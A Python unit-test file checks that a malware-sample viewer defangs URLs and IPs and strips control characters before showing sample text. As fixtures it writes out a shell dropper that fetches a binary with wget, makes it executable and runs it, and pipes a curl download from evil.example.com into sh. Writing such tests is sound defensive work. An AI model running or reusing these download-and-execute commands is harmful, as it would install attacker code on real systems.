"""Text samples are shown on the site, so they must never be runnable there.

A published dropper with live download URLs and C2 addresses is distribution,
whatever the intent. Both text paths in sample_detail, the specimen path and
the short trivial one, must return the content defanged and with control
characters removed, and neither may ever return the raw bytes.
"""

import hashlib
import os
from unittest import mock

from tests.support import DBTestCase
from app.analytics import sessions

DROPPER = (b"#!/bin/sh\ncd /tmp || cd /var/run\n"
           b"wget http://198.51.100.7/bins/x86 -O .x && chmod +x .x && ./.x\n"
           b"curl -s https://evil.example.com:8080/stage2.sh | sh\n"
           b"\x1b[2J\x07echo done\n" + b"# padding\n" * 20)
TINY = b"wget http://203.0.113.9/a\n"


class SampleTextTests(DBTestCase):
    def setUp(self):
        super().setUp()
        p = mock.patch.object(sessions, "SAMPLE_DIR", self.sample_dir)
        p.start()
        self.addCleanup(p.stop)

    def store(self, body):
        sha = hashlib.sha256(body).hexdigest()
        with open(os.path.join(self.sample_dir, sha), "wb") as fh:
            fh.write(body)
        return sha

    def assert_defanged(self, detail, raw_urls, raw_ips):
        text = detail["text"]
        self.assertTrue(detail.get("defanged"))
        for url in raw_urls:
            self.assertNotIn(url, text)
        for ip in raw_ips:
            self.assertNotIn(ip, text)
        self.assertNotIn("\x1b", text)
        self.assertNotIn("\x07", text)

    def test_specimen_text_is_defanged(self):
        detail = sessions.sample_detail(self.con, self.store(DROPPER))
        self.assertFalse(detail.get("trivial"))
        self.assert_defanged(detail, ["http://", "https://", "evil.example.com"], ["198.51.100.7"])
        self.assertIn("hxxp://198[.]51[.]100[.]7/bins/x86", detail["text"])
        self.assertIn("hxxps://evil[.]example[.]com:8080/stage2.sh", detail["text"])

    def test_trivial_text_is_defanged_too(self):
        # The short path used to return the decoded bytes without even the
        # control-character filter the specimen path applied.
        detail = sessions.sample_detail(self.con, self.store(TINY))
        self.assertTrue(detail.get("trivial"))
        self.assert_defanged(detail, ["http://"], ["203.0.113.9"])

    def test_nothing_returned_is_the_raw_sample(self):
        for body in (DROPPER, TINY):
            detail = sessions.sample_detail(self.con, self.store(body))
            self.assertNotEqual(detail["text"].encode(), body)
